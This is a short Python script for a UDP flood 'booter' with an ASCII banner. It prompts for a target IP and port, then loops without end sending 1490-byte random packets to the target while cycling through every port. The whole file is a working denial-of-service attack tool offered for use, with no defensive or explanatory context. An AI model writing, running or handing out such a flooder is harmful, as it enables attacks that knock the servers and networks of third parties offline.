import os
import time
import socket
import random
import click

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
print("""███████╗███╗   ███╗ █████╗ ███╗   ██╗ ██████╗  ██████╗ ██████╗ ███████╗    ██████╗  ██████╗  ██████╗ ████████╗███████╗██████╗ 
██╔════╝████╗ ████║██╔══██╗████╗  ██║██╔════╝ ██╔═══██╗██╔══██╗██╔════╝    ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝██╔════╝██╔══██╗
█████╗  ██╔████╔██║███████║██╔██╗ ██║██║  ███╗██║   ██║██║  ██║███████╗    ██████╔╝██║   ██║██║   ██║   ██║   █████╗  ██████╔╝
██╔══╝  ██║╚██╔╝██║██╔══██║██║╚██╗██║██║   ██║██║   ██║██║  ██║╚════██║    ██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  ██╔══██╗
███████╗██║ ╚═╝ ██║██║  ██║██║ ╚████║╚██████╔╝╚██████╔╝██████╔╝███████║    ██████╔╝╚██████╔╝╚██████╔╝   ██║   ███████╗██║  ██║
╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝    ╚═════╝  ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝""")
ip = input('Target ip: ')
port = int(input('port: '))

os.system("clear")
print("")
print("Your Attack Is Starting...")
print("")

with click.progressbar(range(100000)) as bar:
    for i in bar:
        pass 
time.sleep(1)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packets to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1